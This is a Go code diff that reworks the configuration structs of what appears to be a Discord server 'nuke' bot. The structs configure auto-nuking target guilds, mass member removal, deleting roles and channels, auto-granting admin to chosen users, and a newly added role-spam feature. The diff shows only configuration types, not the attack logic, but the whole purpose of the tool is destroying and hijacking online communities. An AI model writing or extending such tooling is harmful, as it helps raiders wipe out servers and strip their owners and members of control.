@@ -6,12 +6,13 @@ type NukeConfig struct {
 	FeatureConfig FeatureConfig `toml:"feature_config"`
 }
 type FeatureConfig struct {
-	AfterChannelConfig  AfterChannelConfig  `toml:"after_channels"`
-	MemberRemovalConfig MemberRemovalConfig `toml:"member_removal"`
-	AutoNukeConfig      AutoNukeConfig      `toml:"auto_nuke"`
-	DeleteRoles         bool                `toml:"delete_roles"`
-	DeleteChannels      bool                `toml:"delete_channels"`
-	AutoAdmin           []string            `toml:"auto_admin"`
+	AfterChannel   AfterChannelConfig  `toml:"after_channels"`
+	MemberRemoval  MemberRemovalConfig `toml:"member_removal"`
+	AutoNuke       AutoNukeConfig      `toml:"auto_nuke"`
+	RoleSpam       RoleSpamConfig      `toml:"role_spam"`
+	DeleteRoles    bool                `toml:"delete_roles"`
+	DeleteChannels bool                `toml:"delete_channels"`
+	AutoAdmin      []string            `toml:"auto_admin"`
 }
 type MemberRemovalConfig struct {
 	Enabled    bool     `toml:"enabled"`
@@ -30,4 +31,11 @@ type AutoNukeConfig struct {
 	Enabled      bool     `toml:"enabled"`
 	TargetOnly   []string `toml:"target_only"`
 	ExemptGuilds []string `toml:"exempt_guilds"`
+}
+type RoleSpamConfig struct {
+	Enabled    bool     `toml:"enabled"`
+	RoleName   string   `toml:"role_name"`
+	RoleNames  []string `toml:"role_names"`
+	RoleColor  int      `toml:"role_color"`
+	RoleAmount int      `toml:"role_amount"`
 }
